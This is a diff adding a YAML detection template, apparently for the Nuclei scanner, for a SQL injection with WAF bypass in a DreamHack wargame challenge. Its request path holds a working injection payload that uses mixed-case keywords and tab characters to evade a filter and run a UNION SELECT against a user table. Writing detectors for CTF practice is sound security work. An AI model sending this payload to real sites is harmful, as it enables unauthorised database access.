@@ -1,0 +1,30 @@
+id: dreamhack-sqli-bypass-waf
+
+info:
+  name: DreamHack - SQL Injection WAF Bypass
+  author: Gemini
+  severity: high
+  description: |
+    Detects a specific SQL injection vulnerability in a DreamHack wargame scenario.
+    The vulnerability requires bypassing a WAF by using mixed-case keywords for SQL commands
+    and tab characters (%09) as whitespace. The detection is confirmed by executing the MD5()
+    SQL function and matching its known output.
+  reference:
+    - https://dreamhack.io/
+  tags: ctf,wargame,sqli,waf,bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?uid=a'%09uNiOn%09sElEcT%091,MD5(123),3%09fRoM%09user%09wHeRe%09uid='aDmIn'%09--%09"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b70" # MD5 hash of "123"
